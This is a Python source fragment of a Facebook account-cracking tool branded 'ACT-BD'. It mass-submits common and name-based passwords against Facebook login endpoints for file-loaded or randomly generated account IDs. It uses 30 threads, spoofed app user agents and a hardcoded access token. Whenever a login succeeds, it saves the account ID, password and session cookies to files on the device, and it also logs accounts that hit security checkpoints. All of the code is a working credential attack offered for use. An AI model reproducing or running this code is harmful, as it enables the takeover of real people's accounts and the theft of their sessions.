					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				
				plist = []
				try:
					ps_limit = int(input(' How many passwords do you want to add ? '))
				except:
					ps_limit =1
				clear()
				print('\033[1;32m exp: first last,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				clear()
				print(' Do you went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				clear()
				print(' [1] Method M1 \n [2] Method M2')
				linex()
				mth = input(' Choose : ')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' Total account ids : \033[1;32m'+total_ids+f' ')
					print(' \033[1;37mThe process is running in the background')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mth =='1':
							crack_submit.submit(api2,ids,names,passlist)
						elif mth =='2':
							crack_submit.submit(api,ids,names,passlist)
						else:
							crack_submit.submit(api,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python ACT_enc.py')
			elif xd in ['2','02']:
				pak()
			elif xd in ['3','03']:
				os.system('xdg-open https://t.me/AdvancedCyberTech_BD')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
				exit(' Option not found in menu...')

def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 0306,0315,0335,0345')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as act:
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
			print(' \033[1;37mThe process is running in the background')
			linex()
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'khankhan123','khankhan','786786','khan123','khan12345','khan123456','khanbaba','khan786','khankhan12345','malik123','malik12345','khanzada','kingkhan','khan1234','alikhan','pak12345','pak123','ali123','ali12345','ali786','ali123456','jan jan','baloch','baloch123','khan1122','khan12','khan khan','khan0000','janjan']
				act.submit(rd1,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python ACT_enc.py')

def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ACT-BD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        data = {
                                'adid': adid,
                                'format': 'json', 
                                'device_id': device_id,
                                'email': ids, 
                                'password': pas, 
                                'generate_analytics_claims': '1', 
                                'credentials_type': 'password', 
                                'source': 'login', 
                                'error_detail_type': 
                                'button_with_disabled', 
                                'enroll_misauth': 'false', 
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1', 
                                'locale': 'fa_AF', 'client_country_code': 'AF',
                                'fb_api_req_friendly_name': 'authenticate'}
                        headers={
                                'User-Agent':uaa(),
                                'Accept-Encoding': 'gzip, deflate', 
                                'Accept': '*/*', 
                                'Connection': 'keep-alive', 
                                'Authorization':f'OAuth {accessToken}', 
                                'X-FB-Friendly-Name': 'authenticate', 
                                'X-FB-Connection-Type': 'unknown', 
                                'Content-Type': 'application/x-www-form-urlencoded', 
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ACT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ACT-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ACT-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        #print('\r\r\x1b[1;31m [ACT-CP] '+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ACT-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:pass

def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ACT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": uaa(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ACT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ACT-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ACT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ACT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
                                        sys.stdout.write('\r\r\033[1;31m [ACT-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [ACT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ACT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ACT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass
def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ACT-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua  =  "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/14.0.0.20.69;FBBV/12945441;FBDM/{density=3.4,width=480,height=800};FBLC/dz_BT;FBCR/GLOMOBILE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/G3502I;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': uaa(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aking=session.cookies.get_dict().keys()
                        if "c_user" in Aking:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ACT-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ACT-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/ACT-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        ##########print('\r\r\x1b[38;5;208m [ACT-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ACT-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:pass
        loop+=1



try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()